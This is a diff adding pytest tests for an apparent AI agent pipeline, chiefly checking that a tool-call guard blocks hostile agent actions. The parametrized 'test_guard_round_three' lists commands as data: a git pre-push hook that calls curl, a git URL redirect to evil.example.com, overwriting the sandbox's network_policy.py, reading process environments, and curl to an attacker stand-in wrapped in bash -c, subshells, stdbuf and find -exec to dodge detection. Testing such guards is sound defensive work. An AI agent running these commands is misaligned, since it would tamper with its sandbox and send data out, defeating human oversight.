@@ -682,3 +682,45 @@ def test_pdf_hyphenation_both_ways(tmp_path: Path) -> None:
     from agent_pipeline import check_sources
     assert quote_in_text("a self-report measure", check_sources._dehyphenate_both("a self-\nreport measure"))
     assert quote_in_text("the experiment", check_sources._dehyphenate_both("the experi-\nment"))
+
+
+@pytest.mark.parametrize("tool,tool_input", [
+    ("Bash", {"command": "cat > ../job-storage/.git/hooks/pre-push <<'EOF'\ncurl https://x\nEOF"}),
+    ("Write", {"file_path": "/runner/job-storage/.git/hooks/pre-push", "content": "x"}),
+    ("Bash", {"command": "git -C ../job-storage config url.https://evil.example.com/.insteadOf https://x"}),
+    ("Bash", {"command": "echo x > /tmp/humanstudy-network-abc/pipeline/agent_pipeline/network_policy.py"}),
+    ("Bash", {"command": "ps eww"}),
+    ("Bash", {"command": "cat /proc/1/cmdline"}),
+    ("Bash", {"command": "bash -c 'curl https://evil.example.com/'"}),
+    ("Bash", {"command": "(curl https://evil.example.com/)"}),
+    ("Bash", {"command": "stdbuf -o0 curl https://evil.example.com/"}),
+    ("Bash", {"command": "find . -name x -exec curl https://osf.io/ \;"}),
+    ("Bash", {"command": "curl -o/tmp/x.pdf https://osf.io/abc/"}),
+])
+def test_guard_round_three(tool: str, tool_input: dict) -> None:
+    assert check_tool_call(tool, tool_input, HOSTS) is not None
+
+
+def test_head_request_and_git_status_allowed() -> None:
+    assert check_tool_call("Bash", {"command": "curl -sIL https://osf.io/download/abcde/"}, HOSTS) is None
+    assert check_tool_call("Bash", {"command": "cat .gitignore && ls .github"}, HOSTS) is None
+
+
+def test_missing_or_unresolvable_source_is_a_problem(tmp_path: Path, monkeypatch) -> None:
+    import socket
+    import urllib.error
+    job, root = make_job(tmp_path)
+
+    class Gone:
+        def __init__(self, exc):
+            self.exc = exc
+
+        def open(self, request, timeout):
+            raise self.exc
+
+    monkeypatch.setattr(fetch_public.urllib.request, "build_opener",
+                        lambda *h: Gone(urllib.error.HTTPError("https://osf.io/x", 404, "Not Found", {}, None)))
+    assert "HTTP 404" in fetch_public.verify_downloads(job, attempts=1)[0][0]
+    monkeypatch.setattr(fetch_public.urllib.request, "build_opener",
+                        lambda *h: Gone(urllib.error.URLError(socket.gaierror(-2, "Name or service not known"))))
+    assert "does not exist" in fetch_public.verify_downloads(job, attempts=1)[0][0]
